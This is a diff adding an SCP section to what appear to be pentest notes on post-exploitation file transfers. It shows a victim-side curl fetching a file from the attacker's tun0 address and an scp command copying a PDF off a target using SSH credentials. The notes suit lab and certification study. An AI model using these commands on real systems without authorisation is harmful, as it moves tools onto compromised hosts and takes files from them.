@@ -96,6 +96,22 @@ On Victim:
 curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
 ```
 
+## SCP
+
+* Is SSH open?
+* SSH Creds or Key
+* Identify path of file you want with <mark style="color:red;">`pwd`</mark>
+
+```
+scp user@10.10.10.1:C:/ftp/infrastructure .
+password:
+
+Infrastructure.pdf                                                     100%   45KB 240.7KB/s   00:00    
+
+```
+
+
+
 ## References
 
 {% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}
